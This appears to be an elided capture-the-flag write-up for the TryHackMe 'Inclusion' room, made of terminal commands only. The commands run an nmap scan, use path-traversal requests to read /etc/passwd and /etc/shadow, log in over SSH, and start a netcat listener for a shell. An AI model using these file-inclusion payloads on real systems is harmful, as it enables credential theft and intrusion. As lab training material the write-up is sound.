...
```
bibo318@parrot:~/CTFs/tryhackme/Inclusion$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.174.186
...
```
bibo318@parrot:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/passwd | html2text
...
```
bibo318@parrot:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/shadow | html2text
...
```
bibo318@parrot:~/CTFs/tryhackme/Inclusion$ ssh falconfeast@10.10.174.186The authenticity of host '10.10.174.186 (10.10.174.186)' can't be established.
...
```
bibo318@parrot:~/CTFs/tryhackme/Inclusion$ nc -nlvp 9001
